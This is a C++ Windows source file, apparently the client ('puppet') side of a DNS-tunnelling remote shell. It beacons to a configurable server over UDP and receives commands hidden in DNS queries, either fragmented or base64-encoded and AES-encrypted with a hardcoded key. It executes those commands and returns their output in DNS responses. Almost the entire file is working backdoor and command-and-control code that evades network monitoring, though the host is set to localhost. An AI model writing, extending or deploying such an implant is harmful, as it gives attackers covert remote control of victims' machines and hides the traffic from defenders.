#include<iostream>
#include<vector>
#include<sstream>
#include "PuppetManager.h"
#include <string>
#include<algorithm>

#include "Dns.h"
#include "AES.h"


// 分割字符串函数
std::vector<std::string> split(const std::string& str, char delimiter) {
    std::vector<std::string> tokens;
    std::string token;
    std::istringstream tokenStream(str);

    while (std::getline(tokenStream, token, delimiter)) {
        tokens.push_back(token);
    }

    return tokens;
}

// 提取并拼接中间的数据部分，不添加空格
std::string extractAndConcatenateWithoutSpaces(const std::string& input) {
    std::vector<std::string> parts = split(input, '.');
    std::string result;

    for (size_t i = 3; i + 1 < parts.size(); ++i) { // 修改循环条件防止越界
        if (parts[i] == "bing") {
            break;
        }
        result += parts[i];
    }

    return result;
}

BOOL StartShell(const char* serverIP, const char* usPort) {

    std::cout << "Creating PuppetManager..." << std::endl;

    PuppetManager* puppetManager = new PuppetManager();

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    const int CMD_LEN_BUF = 4096;

    //std::vector<char> buffer(CMD_LEN_BUF);
    
    DNSHeader header{};
    header.id = htons(1234);
    header.flags = htons(0x0100);  // 标准查询
    header.questions = htons(0x01);

    TunnelRequest request;
    TunnelResponse response;
    DNS dnsQuery(header, request, response);

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(static_cast<u_short>(std::stoi(usPort)));
    inet_pton(AF_INET, serverIP, &serverAddr.sin_addr);

    // 呼叫数据
    std::string hello = "Hello,this is puppet probe!!!";

    dnsQuery.sendRequest(sock, hello, serverIP, static_cast<u_short>(std::stoi(usPort)));
    
    //DNSHeader header{};
    header.id = htons(0x1234);
    header.flags = htons(0x8180);

    DNS dnsResponse(header, request, response);

    
    while (true) {
        // 接收单个数据包（可能是探针/分片/普通请求）
        sockaddr_in clientAddr;
        int clientLen = sizeof(clientAddr);
        std::vector<uint8_t> buffer(CMD_LEN_BUF);

        std::cout << "等待服务端发送指令:" << std::endl;

        //为何这里第二次循环的时候无法阻塞住
        int recvLen = recvfrom(sock, (char*)buffer.data(), buffer.size(), 0,
            (sockaddr*)&clientAddr, &clientLen);

        if (recvLen <= 0) {

            std::cerr << WSAGetLastError() << std::endl;
            continue;
        }

        // 提取查询数据并判断类型
        std::string query = dnsQuery.extractQueryData(buffer);
        buffer.clear();

        std::cout << query << std::endl;

        // 情况1：探针报文（触发分片接收流程）
        if (query.find("probe.") == 0) {
            std::vector<std::string> parts;
            std::istringstream iss(query);
            std::string part;
            while (std::getline(iss, part, '.')) parts.push_back(part);

            if (parts.size() >= 3 && parts[0] == "probe") {
                uint16_t totalFrags = static_cast<uint16_t>(std::stoi(parts[1]));
                bool isMulti = (parts[2] == "1");

                // 调用分片接收函数（阻塞直到收齐或超时）
                std::map<uint16_t, std::string> fragments =
                    dnsResponse.receiveFragmentsClient2Server(sock, clientAddr);

                // 验证分片完整性
                if (fragments.size() == totalFrags) {
                    
                    std::string fullCmd = dnsResponse.assembleFragments(fragments);
                    fullCmd.erase(fullCmd.find_last_not_of("\r\n") + 1);  // 清理换行符

                    // 处理退出命令
                    if (fullCmd.substr(0, 4) == "exit") {
                        
                        std::string exitMsg = "byby dear shiyue!!!";

                        dnsResponse.sendResponse(sock, clientAddr, exitMsg);

                        std::cout << "Exit command received. Closing connection..." << std::endl;

                        break;
                    }

                    // 执行命令
                    if (!fullCmd.empty() &&
                        std::any_of(fullCmd.begin(), fullCmd.end(), [](char c) {
                            return std::isprint(static_cast<unsigned char>(c));
                            })) {

                        puppetManager->setCmdList(fullCmd);
                        std::string result = puppetManager->exec();

                        // 发送执行结果
                        if (result.empty()) {
                            result = "No output!!!";
                        }

                        dnsResponse.sendResponse(sock, clientAddr, result);
                    }
                }
                else {
                    std::cerr << "Fragment missing: "
                        << totalFrags - fragments.size()
                        << " fragments lost." << std::endl;
                }
            }
            continue;
        }

        // 情况2：普通请求（直接处理）
        query.erase(query.find_last_not_of("\r\n") + 1);  // 清理换行符

        std::string key = "weiweiSecretKey123!";
        std::string command = Encrypt::decodeByAES(dnsQuery.base64Decode(extractAndConcatenateWithoutSpaces(query)),key);
        //std::string command = dnsQuery.base64Decode(extractAndConcatenateWithoutSpaces(query));

        // 处理退出命令
        if (command.substr(0, 4) == "exit") {

            std::string exitMsg = "byby dear shiyue!!!";

            dnsResponse.sendResponse(sock, clientAddr, exitMsg);

            std::cout << "Exit command received. Closing connection..." << std::endl;

            break;
        }

        // 执行命令
        if (!command.empty() &&
            std::any_of(command.begin(), command.end(), [](char c) {
                return std::isprint(static_cast<unsigned char>(c));
                })) {

            puppetManager->setCmdList(command);
            std::string result = puppetManager->exec();

            // 发送执行结果
            if (result.empty()) {
                result = "No output!!!";
            }
            std::cout << "命令结果：" << result << std::endl;

            dnsResponse.sendResponse(sock, clientAddr, result);
        }
    }

    // 清理资源
    shutdown(sock, SD_BOTH);
    closesocket(sock);
    WSACleanup();
    delete puppetManager;

    return TRUE;
}

int main(int argc, char* argv[]) {

	std::cout << "傀儡端启动!!!" << std::endl;

	/*if (3 != argc) {

		std::cout << "参数数量错误，需要ip地址和端口号!!!" << std::endl;

		return -1;
	}

	char* host = argv[1];
	char* port = argv[2];*/
    
    /*const char* host = "127.0.0.1";
	const char* port = "8089";*/
    const char* host = "127.000.000.001";
	const char* port = "08081";

	StartShell(host,port);

	return 0;
}